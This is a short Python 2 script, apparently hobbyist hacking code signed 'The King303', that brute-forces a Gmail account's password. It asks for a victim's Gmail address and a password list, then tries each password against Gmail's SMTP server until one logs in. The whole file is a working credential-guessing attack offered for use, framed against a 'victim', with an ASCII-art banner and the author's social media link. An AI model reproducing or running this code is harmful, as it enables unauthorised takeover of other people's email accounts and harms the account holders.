import smtplib
from os import system

print """The King 303 Security      _____ ___  ____            ____  _              __     ___                     ____        _                                                     
    echo "          _____                    _____                   _______                   _____                    _____                    _____          ";
echo "         /\    \                  /\    \                 /::\    \                 /\    \                  /\    \                  /\    \         ";
echo "        /::\    \                /::\    \               /::::\    \               /::\____\                /::\    \                /::\____\        ";
echo "       /::::\    \              /::::\    \             /::::::\    \             /:::/    /               /::::\    \              /::::|   |        ";
echo "      /::::::\    \            /::::::\    \           /::::::::\    \           /:::/    /               /::::::\    \            /:::::|   |        ";
echo "     /:::/\:::\    \          /:::/\:::\    \         /:::/~~\:::\    \         /:::/    /               /:::/\:::\    \          /::::::|   |        ";
echo "    /:::/__\:::\    \        /:::/__\:::\    \       /:::/    \:::\    \       /:::/____/               /:::/__\:::\    \        /:::/|::|   |        ";
echo "   /::::\   \:::\    \      /::::\   \:::\    \     /:::/    / \:::\    \     /::::\    \              /::::\   \:::\    \      /:::/ |::|   |        ";
echo "  /::::::\   \:::\    \    /::::::\   \:::\    \   /:::/____/   \:::\____\   /::::::\____\________    /::::::\   \:::\    \    /:::/  |::|   | _____  ";
echo " /:::/\:::\   \:::\ ___\  /:::/\:::\   \:::\____\ |:::|    |     |:::|    | /:::/\:::::::::::\    \  /:::/\:::\   \:::\    \  /:::/   |::|   |/\    \ ";
echo "/:::/__\:::\   \:::|    |/:::/  \:::\   \:::|    ||:::|____|     |:::|    |/:::/  |:::::::::::\____\/:::/__\:::\   \:::\____\/:: /    |::|   /::\____\";
echo "\:::\   \:::\  /:::|____|\::/   |::::\  /:::|____| \:::\    \   /:::/    / \::/   |::|~~~|~~~~~     \:::\   \:::\   \::/    /\::/    /|::|  /:::/    /";
echo " \:::\   \:::\/:::/    /  \/____|:::::\/:::/    /   \:::\    \ /:::/    /   \/____|::|   |           \:::\   \:::\   \/____/  \/____/ |::| /:::/    / ";
echo "  \:::\   \::::::/    /         |:::::::::/    /     \:::\    /:::/    /          |::|   |            \:::\   \:::\    \              |::|/:::/    /  ";
echo "   \:::\   \::::/    /          |::|\::::/    /       \:::\__/:::/    /           |::|   |             \:::\   \:::\____\             |::::::/    /   ";
echo "    \:::\  /:::/    /           |::| \::/____/         \::::::::/    /            |::|   |              \:::\   \::/    /             |:::::/    /    ";
echo "     \:::\/:::/    /            |::|  ~|                \::::::/    /             |::|   |               \:::\   \/____/              |::::/    /     ";
echo "      \::::::/    /             |::|   |                 \::::/    /              |::|   |                \:::\    \                  /:::/    /      ";
echo "       \::::/    /              \::|   |                  \::/____/               \::|   |                 \:::\____\                /:::/    /       ";
echo "        \::/____/                \:|   |                   ~~                      \:|   |                  \::/    /                \::/    /        ";
echo "         ~~                       \|___|                                            \|___|                   \/____/                  \/____/         ";
echo "                                                                                                                                                      ";                                   
"""
print """Thise Script Maded By The King303 1 Pas Hack""" 
print """Thise Script Maded By The King303 1 Pas Hack""" 
print """Thise Script Maded By The King303 1 Pas Hack""" 
print """Thise Script Maded By The King303 1 Pas Hack""" 
print """Thise Script Maded By The King303 1 Pas Hack""" 

print """      My Acount https://www.facebook.com/The.King303  """

print '[1] Start broken Attackes'
print '[2] Exit'
option = input('==>')
if option == 1:
   file_path = raw_input('Patch The Password Text ^_^ :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input("Enter The Gmail Of Victim ^_^ : ")
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         
         print '\n'
         print 'Lol Password Found ^_^, password :) ' + password 
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            
            print 'Lol Password Found ^_^ , password :) ' + password 

            break
         else:
            print 'password Un Correct Oooooo No :( =>: ' + password
login()


print """   :( If Password Not Found On The Text :(       :( Try Another Password List :(           """

print """                   Coded By The King303 Security ^_^        """

print """                                                                                                """

print """                 My Acount https://www.facebook.com/The.King303    """
